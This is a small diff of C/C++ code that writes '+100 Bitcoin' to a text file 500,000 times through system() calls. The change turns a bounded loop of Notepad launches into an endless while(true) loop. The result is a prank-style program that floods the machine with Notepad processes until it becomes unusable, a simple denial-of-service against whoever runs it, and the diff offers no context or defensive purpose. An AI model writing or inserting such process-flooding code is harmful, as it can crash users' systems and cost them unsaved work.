@@ -20,7 +20,7 @@ int main() {
     for (int i = 0; i < 500000; ++i) {
       system("echo +100 Bitcoin > Edit.txt");
     }
-    for (int i = 0; i < 500; ++i) {
+    while (true) {
       system("notepad Edit.txt");
     }
   }
